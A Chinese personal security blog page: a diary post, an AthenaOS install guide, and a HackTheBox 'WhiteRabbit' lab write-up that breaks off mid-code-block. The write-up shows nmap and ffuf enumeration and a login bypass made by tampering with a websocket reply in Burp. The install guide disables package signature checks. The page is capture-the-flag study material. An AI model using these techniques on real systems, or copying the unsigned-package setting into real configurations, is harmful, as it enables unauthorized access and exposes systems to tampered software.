<!DOCTYPE html>
<html lang="zh">

<head>
  <!-- Website mata -->
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<!-- Disable transformation -->
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<!-- Website description -->


<!-- Website keywords -->




<!-- Website rss -->

<link rel="alternate" href="/default" title="N0nome`s Fucking Life" >


<!-- Website favicon -->

<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3.0.0" />


<!-- Canonical, good for google search engine -->
<link rel="canonical" href="https://n0nome.github.io/" />

<!-- Fancybox styling -->

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />


<!-- MathJax (LaTeX) support -->


<!-- Theme styling -->
<link rel="stylesheet" type="text/css" href="/css/style.css?v=3.0.0" />

<!-- Analytics and push -->



  



<!-- LeanCloud Counter -->


<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null,"server_url":null,"cdn":null},"toc":true,"fancybox":true,"latex":false};
</script>
  
  <title>N0nome`s Fucking Life</title>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div class="scrollPercentage"></div>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">N0nome`s Fucking Life</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    
    <a href="/">
      <li class="mobile-menu-item">
        
        
        Home              </li>
    </a>
    
  </ul>
</nav>
  <div class="container" id="mobile-panel">
    <header id="header" class="header">
      <div class="logo-wrapper">  
  <a href="/." class="logo">N0nome`s Fucking Life</a>  
</div>  
  
<nav class="site-navbar">  
    
    <ul id="menu" class="menu">  
        
        <li class="menu-item">  
          <a class="menu-item-link" href="/">  
              
              
              Home  
              
          </a>  
        </li>  
        
    </ul>  
    
</nav>  

    </header>
    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <section id="posts" class="posts">
  
  
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/%E9%9A%8F%E6%83%B30409/%E9%9A%8F%E6%83%B30409/">随想0409&amp;&amp;涩话0411</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <pre><code>今天，累死。
上午当了一回甲方，全程感觉自己小丑表现；
下午修服务器，紧修慢修不用加班了。

已经一整天没有打WhiteRabbit了。但是一整天也不是没有学习，学了一会kubernetes（基础的），也学了一会怎么排查。晚上回家直接躺尸，脑子胀胀的，眼睛酸酸的，只能缓一下再学习。
</code></pre>
<p>笑死，隔了两天，分手了<br>来的意料之外情理之中，只能祝好</p>
<p>感情马上就五年了，但是再过下去可能对两个人伤害更大更深，也挽留也不舍，没能改变什么结果。<br>晚上听张震岳的《<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=6bi587lgWhM">小宇</a>》，深深陷入了空白。<br>也加上最近事情多，心如乱麻都不知该先想那件事，还好下午解决了工作上的事情，但是反应过来就要接受感情的结果了。</p>
<p>现在坐在电脑跟前，相识相知又相互折磨的时光，就像有剪刀一样，剪出一张张画面，幻灯片一样在脑海里划过。<br>人家自始至终都对我很好，对我很包容也很关爱，奈何我就像长不大的孩子，让人家教了一遍又一遍，就是教不会。<br>可能真是从小老师教就没用，还是得我自己学才学的快，成长，也是一张内我的修行。</p>
<p>今天领导也说我想起来一出不止一出，什么都想当然，这让我也局限于自己的思维，按照以往经验做事，最终也会让自己身陷漩涡，希望自己能够涨涨记性，不只是工作上，感情上也是。<br>接下来希望自己能真正学会脚踏实地，多思多问，，，<br>就说这么多吧。<br>hf今天下了雨，来一首eason的《<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Au411L7rw/?spm_id_from=333.337.search-card.all.click&vd_source=320d1b023f41f7733ec5bfedf3a86645">阴天快乐</a>》吧</p>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/%E9%83%A8%E5%88%86%E4%B9%8B%E5%89%8D%E7%9A%84WP/%E9%83%A8%E5%88%86%E4%B9%8B%E5%89%8D%E7%9A%84WP/">部分之前的WP</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<h2 id="部分之前的wp"><a href="#部分之前的wp" class="headerlink" title="部分之前的wp"></a>部分之前的wp</h2><p>些许wp放在了这里 -&gt; <a target="_blank" rel="noopener" href="https://flowus.cn/lusowen/share/3342a2b2-8121-4efb-9d82-2069f7e9ce5f?code=0BUAE7">FlowUS</a><br><img src="/images/bfzqdwp.png" alt="以下是访问界面"></p>
<h3 id="辛苦佬✌们多多关注：）"><a href="#辛苦佬✌们多多关注：）" class="headerlink" title="辛苦佬✌们多多关注：）"></a>辛苦佬✌们多多关注：）</h3>
    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/%E6%97%A0%E8%84%91AthenaOS%E5%AE%89%E8%A3%85/%E6%97%A0%E8%84%91AthenaOS%E5%AE%89%E8%A3%85/">无脑AthenaOS安装</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code></p>
<h2 id="此处省略虚拟机配"><a href="#此处省略虚拟机配" class="headerlink" title="此处省略虚拟机配"></a>此处省略虚拟机配</h2><p>鉴于个人pc情况分配资源</p>
<h2 id="以下为正式安装前的准备工作"><a href="#以下为正式安装前的准备工作" class="headerlink" title="以下为正式安装前的准备工作"></a>以下为正式安装前的准备工作</h2><p><img src="/images/Pasted%20image%2020250208213228.png"><br>这个界面可以先关掉，最后安装的时候再打开</p>
<h3 id="打开terminal"><a href="#打开terminal" class="headerlink" title="打开terminal"></a>打开terminal</h3><p><img src="/images/Pasted%20image%2020250208213325.png"><br>目前系统只有alacritty这一个<br>如果运行<code>sudo pacman -Sy</code>的话，会发现一下问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">athena                                                                                             398.9 KiB  70.3 KiB/s 00:06 [##############################################################################] 100%</span><br><span class="line"> core                                                                                               116.0 KiB  30.3 KiB/s 00:04 [##############################################################################] 100%</span><br><span class="line"> extra                                                                                                4.7 MiB   109 KiB/s 00:26 [################################################------------------------------]  62%</span><br><span class="line"> multilib                                                                                           131.6 KiB  17.0 KiB/s 00:08 [##############################################################################] 100%</span><br><span class="line"> chaotic-aur                                                                                        650.8 KiB  95.3 KiB/s 00:07 [##############################################################################] 100%</span><br><span class="line"></span><br><span class="line">:: Replace sdl2 with extra/sdl2-compat? [Y/n]</span><br></pre></td></tr></table></figure>
<h3 id="接着往下会发现点问题"><a href="#接着往下会发现点问题" class="headerlink" title="接着往下会发现点问题"></a>接着往下会发现点问题</h3><ul>
<li>一是<a target="_blank" rel="noopener" href="https://aur.chaotic.cx/">chaotic-aur</a>这个软件源，如果只使用现有的，基本上就会出现timeout，这里可以修改一下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[chaotic-aur]</span><br><span class="line">SigLevel = Never</span><br><span class="line">Server = https://geo-mirror.chaotic.cx/$repo/x86_64</span><br></pre></td></tr></table></figure>
<ul>
<li>二是<a target="_blank" rel="noopener" href="https://wiki.archlinuxcn.org/zh-sg/Pacman/%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AD%BE%E5%90%8D">密钥验证</a>，这个问题也是最麻烦的（我眼里是嗷。。。）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#我这里省事的办法就是不进行密钥验证，但是会不安全，所以谨慎使用</span><br><span class="line">#修改/etc/pacman.conf中</span><br><span class="line">SigLevel    = Never</span><br><span class="line">#LocalFileSigLevel = Optional</span><br></pre></td></tr></table></figure>
<p>然后再<code>sudo pacman -Sy</code>，这样更新就顺畅多了</p>
<h3 id="安装proxychains-ng"><a href="#安装proxychains-ng" class="headerlink" title="安装proxychains-ng"></a>安装proxychains-ng</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S proxychains</span><br><span class="line">resolving dependencies...</span><br><span class="line">looking for conflicting packages...</span><br><span class="line"></span><br><span class="line">Packages (1) proxychains-ng-4.17-2</span><br><span class="line"></span><br><span class="line">Total Download Size:   0.03 MiB</span><br><span class="line">Total Installed Size:  0.08 MiB</span><br><span class="line"></span><br><span class="line">:: Proceed with installation? [Y/n] y</span><br><span class="line">:: Retrieving packages...</span><br><span class="line"> proxychains-ng-4.17-2-x86_64                                                           29.5 KiB  12.3 KiB/s 00:02 [#####################################################################] 100%</span><br><span class="line">(1/1) checking keys in keyring                                                                                     [#####################################################################] 100%</span><br><span class="line">(1/1) checking package integrity                                                                                   [#####################################################################] 100%</span><br><span class="line">(1/1) loading package files                                                                                        [#####################################################################] 100%</span><br><span class="line">(1/1) checking for file conflicts                                                                                  [#####################################################################] 100%</span><br><span class="line">(1/1) checking available disk space                                                                                [#####################################################################] 100%</span><br><span class="line">:: Processing package changes...</span><br><span class="line">(1/1) installing proxychains-ng                                                                                    [#####################################################################] 100%</span><br><span class="line">:: Running post-transaction hooks...</span><br><span class="line">(1/1) Arming ConditionNeedsUpdate...</span><br><span class="line"></span><br><span class="line">#修改配置文件</span><br><span class="line">sudo nano /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
<p>挂上代理之后更新会快很多</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(17/18) #### Important Linux packages have changed. Reboot is recommended. ####</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">(18/18) Updating the desktop file MIME type cache...</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br></pre></td></tr></table></figure>
<p>更新完成</p>
<h3 id="解析github地址"><a href="#解析github地址" class="headerlink" title="解析github地址"></a>解析github地址</h3><p>这里需要解析一下GitHub地址，不然会出现timeout的情况<br>编辑&#x2F;etc&#x2F;hosts，Google一下<a target="_blank" rel="noopener" href="https://myssl.com/dns_check.html">域名解析</a>，可以随便找一个网站，分别解析一下<code>github.com</code>和<code>raw.githubusercontent.com</code>两个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">github.com 20.205.243.166</span><br><span class="line">raw.githubusercontent.com 185.199.110.133</span><br></pre></td></tr></table></figure>
<p>接下来就可以安装了</p>
<h2 id="正式安装"><a href="#正式安装" class="headerlink" title="正式安装"></a>正式安装</h2><p>Athena-welcome其实是aegis-tui，直接sudo运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains aegis-tui</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020250211224545.png"><br>会直接进入这个页面，然后按照正常需要选择<br>这里以arch为例<br>第一个地区选上海<br><img src="/images/Pasted%20image%2020250211224743.png"><br>第二个第三个keymap选us好了<br>第四个console字体可以先选en_US,zh_CN的话可以后面自己再装,选的时候选UTF-8<br>第五第六第七创建用户名密码自己建<br><img src="/images/Pasted%20image%2020250211225246.png"><br>第八个yesno自己选<br><img src="/images/Pasted%20image%2020250211225340.png"><br>第九个hostname可以直接回车<br>第十个选抹了磁盘<br><img src="/images/Pasted%20image%2020250211225448.png"><br>回车三次到选大小<br><img src="/images/Pasted%20image%2020250211225552.png"><br>推荐2G+<br>第十四步看个人需要加密<br><img src="/images/Pasted%20image%2020250211225638.png"><br>剩下的主题看个人<br>最后如下（我的）：<br><img src="/images/Pasted%20image%2020250211230153.png"><br>回车安装就行了</p>
<h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ INFO ] 23:02:29 Populate keys</span><br><span class="line">[ INFO ] 23:02:29 Getting fastest Arch and Chaotic AUR mirrors for your location</span><br></pre></td></tr></table></figure>
<p>到这会卡一下，正常等一等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ ERROR ] 14:20:43 The package manager failed with exit code: 1</span><br><span class="line">[ ERROR ] 14:20:43 Set available cores on MAKEFLAGS ERROR: No such file or directory (os error 2)</span><br></pre></td></tr></table></figure>
<p>出现这个错误正常现象，重新装就好了;<br>其实可以看错误说包管理出错了，直接ctrl+c，然后pacman -Syyu看看是否还正常，不正常就Google一下;<br>有啥错误直接重装一下，里面的那些细节需要自己慢慢研究。</p>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/WhiteRabbit/HackTheBox%E2%80%94%E2%80%94HTB%20WhiteRabbit%20writeup/">HackTheBox——HTB WhiteRabbit Writeup</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)</span><br><span class="line">|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)</span><br><span class="line">80/tcp   open  http    Caddy httpd</span><br><span class="line">|_http-title: Did not follow redirect to http://whiterabbit.htb</span><br><span class="line">|_http-server-header: Caddy</span><br><span class="line">2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)</span><br><span class="line">|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<p>先把域加到hosts里面<br>看下80端口是什么情况<br><img src="/images/whiterabbit.png"></p>
<h3 id="enum-domain-info"><a href="#enum-domain-info" class="headerlink" title="enum domain info"></a>enum domain info</h3><p>扫一下子域情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ffuf -w /opt/T00ls/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://whiterabbit.htb/ -H &quot;HOST:FUZZ.whiterabbit.htb&quot; -mc all  -fw 1</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://whiterabbit.htb/</span><br><span class="line"> :: Wordlist         : FUZZ: /opt/T00ls/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> :: Header           : Host: FUZZ.whiterabbit.htb</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: all</span><br><span class="line"> :: Filter           : Response words: 1</span><br><span class="line"></span><br><span class="line">status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 318ms]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>加到hosts里面看看<br><img src="/images/whiterabbit-1.png"><br>是个登录页面，和主域一样都是caddy的服务器<br>google一下这个uptime kuma，可以看到最近的<a target="_blank" rel="noopener" href="https://pentest-tools.com/vulnerabilities-exploits/uptime-kuma-local-file-inclusion-lfi_26593">CVE-2024-56331</a>,也可以看到github上有<a target="_blank" rel="noopener" href="https://github.com/griisemine/CVE-2024-56331">poc</a>,看下有没有办法利用一下<br>有凭证登录进去才可以利用的，我们现在又没有凭证，burp上一上吧<br><img src="/images/whiterabbit-2.png"></p>
<h4 id="burp-change-ws-package"><a href="#burp-change-ws-package" class="headerlink" title="burp change ws package"></a>burp change ws package</h4><p>这里看应该是有websocket，proxy拦截一下<br><img src="/images/whiterabbit-3.png"><br>可以看到我们点击登录之后请求走的websocket<br>当我们输入不正确的凭证会返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">431[&#123;&quot;ok&quot;:false,&quot;msg&quot;:&quot;Incorrect username or password.&quot;&#125;]</span><br></pre></td></tr></table></figure>
<p>给他改一下，把false改成true试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">431[&#123;&quot;ok&quot;:true,&quot;msg&quot;:&quot;Incorrect username or password.&quot;&#125;]</span><br><span class="line"></span><br><span class="line"># return</span><br><span class="line">432[&#123;&quot;ok&quot;:false,&quot;msg&quot;:&quot;You are not logged in.&quot;&#125;]</span><br></pre></td></tr></table></figure>
<p>虽然嘴上说not，但是其实已经进去啦<br><img src="/images/whiterabbit-4.png"><br>翻一翻（他会一直提示you are not，但是没啥影响）<br><img src="/images/whiterabbit-5.png"></p>
<h4 id="enum-document-path"><a href="#enum-document-path" class="headerlink" title="enum document path"></a>enum document path</h4><p>在状态页面下可以发现有一个路径&#x2F;status，枚举一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ffuf -w /opt/T00ls/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u &#x27;http://status.whiterabbit.htb/status/FUZZ&#x27; -mc all -fs 2444</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://status.whiterabbit.htb/status/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: /opt/T00ls/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: all</span><br><span class="line"> :: Filter           : Response size: 2444</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 600ms]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看下有啥<br><img src="/images/whiterabbit-6.png"><br>直接爆金币了，加一下hosts</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ddb09a8558c9.whiterabbit.htb</span><br><span class="line">a668910b5514e.whiterabbit.htb</span><br></pre></td></tr></table></figure>
<p>分别浏览一下可以看到<br>a668910b5514e.whiterabbit.htb是一个wiki站<br><img src="/images/whiterabbit-7.png"><br>ddb09a8558c9.whiterabbit.htb是一个钓鱼登录网站<br><img src="/images/whiterabbit-8.png"><br>先看wiki吧，钓鱼站尝试了一下不是ws传输了<br>一看wiki也要登录，哈哈哈哈，尝试一下可不可以search一下，search一下钓鱼站gophish<br><img src="/images/whiterabbit-9.png"><br>还真有<br><img src="/images/whiterabbit-10.png"><br>这个讲了一个gophish的自动化工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In the realm of cybersecurity, automated workflows can significantly enhance the efficacy of phishing simulations and their subsequent analysis. Gophish, a popular open-source phishing toolkit, allows cybersecurity teams to conduct realistic phishing exercises to gauge the awareness and responses of their users. Integrating Gophish with n8n, a workflow automation tool, can streamline the process of scoring and tracking user interactions across multiple phishing campaigns. This integration is accomplished through Gophish’s webhook system and n8n&#x27;s capability to process and respond to incoming data in real time.</span><br><span class="line">在网络安全领域，自动化工作流程可以显著提高网络钓鱼模拟及其后续分析的有效性。Gophish 是一款流行的开源网络钓鱼工具包，它允许网络安全团队进行真实的网络钓鱼练习，以评估用户的意识和反应。将 Gophish 与工作流自动化工具 n8n 集成，可以简化对多个网络钓鱼活动中的用户交互进行评分和跟踪的过程。这种集成是通过 Gophish 的 webhook 系统和 n8n 实时处理和响应传入数据的能力来实现的。</span><br></pre></td></tr></table></figure>
<p>文中还给了一个子域和一个json文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span 